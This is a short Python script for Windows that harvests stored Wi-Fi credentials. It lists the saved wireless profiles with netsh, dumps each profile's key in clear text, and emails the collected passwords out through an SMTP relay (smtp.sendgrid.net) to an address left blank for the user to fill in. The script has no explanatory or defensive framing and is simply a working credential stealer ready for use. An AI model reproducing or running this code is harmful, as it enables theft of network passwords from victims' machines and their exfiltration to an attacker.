#!/usr/bin/env python3

import subprocess, smtplib, re

def send_mail(email, to, password, messege):
    server = smtplib.SMTP("smtp.sendgrid.net", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(to, to, messege)
    server.quit()

command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True).decode()
networks_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)
result = ""

for network_name in networks_names_list:
    command = "netsh wlan show profile "+ network_name + " key=clear"
    try:
        current_result = subprocess.check_output(command, shell=True).decode()
    except:
        pass
    result = result + current_result

email = ""
password = ""
to = ""
send_mail(email, to, password, result)
